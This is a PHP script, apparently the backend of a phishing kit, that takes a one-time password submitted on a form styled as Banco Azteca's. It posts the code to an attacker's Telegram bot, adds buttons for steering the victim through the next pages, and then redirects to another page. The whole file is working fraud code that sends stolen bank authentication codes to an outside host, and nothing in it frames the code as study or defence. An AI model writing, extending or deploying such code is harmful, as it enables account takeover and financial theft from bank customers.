<?php
session_start();

// Incluir el archivo con las variables del bot de Telegram
include 'variables.php'; // Cambia 'variables.php' por el nombre real del archivo

// Función para enviar mensajes con botones a través de Telegram
function messeger($mensaje, $datosToken, $TxtBanco) {
    // Guardar el valor del banco en la sesión
    $_SESSION['bank'] = $TxtBanco;

    $token = $datosToken['token'];
    $chatId = $datosToken['chatId'];

    $buttons = [
        ["🏦LG"],
        ["❌OTP-AZTECA", "✅FINAL"]
    ];

    $keyboard = [
        'inline_keyboard' => array_map(function ($row) {
            return array_map(function ($button) {
                return ['text' => $button, 'callback_data' => $button];
            }, $row);
        }, $buttons),
        'resize_keyboard' => true,
    ];

    $message = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'reply_markup' => json_encode($keyboard),
    ];

    // URL de la API de Telegram
    $apiURL = "https://api.telegram.org/bot$token/sendMessage";

    // Usar cURL para hacer la solicitud POST a la API de Telegram
    $ch = curl_init($apiURL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $message);

    // Ejecutar la solicitud y obtener la respuesta
    $response = curl_exec($ch);
    curl_close($ch);

    // Retornar la respuesta si necesitas manejarla
    return $response;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Construir el mensaje con el OTP recibido
    $mensaje = "Banco AZTECA\n OTP: " . $_POST['otp'];

    // Llamar a la función messeger para enviar el mensaje
    $datosToken = [
        'token' => $telegramToken,
        'chatId' => $chatId
    ];
    
    // Suponiendo que $TxtBanco es una variable que obtienes de alguna parte del formulario POST
    $TxtBanco = 'Azteca'; // O asigna el valor que desees

    messeger($mensaje, $datosToken, $TxtBanco);

    // Redirigir a global.php después de enviar el mensaje
    header("Location: global.php");
    exit();
}
?>
